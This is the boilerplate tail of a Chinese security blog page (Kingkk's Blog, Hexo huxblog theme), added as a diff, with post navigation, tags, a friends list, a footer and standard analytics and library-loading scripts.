+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/Apache-Nginx中Host头攻击的一些差异/" data-toggle="tooltip" data-placement="top" title="Apache/Nginx中Host头攻击的一些差异">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/09/vulnhub-GeminiInc/" data-toggle="tooltip" data-placement="top" title="vulnhub-GeminiInc">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#ThinkPHP" title="ThinkPHP">ThinkPHP</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
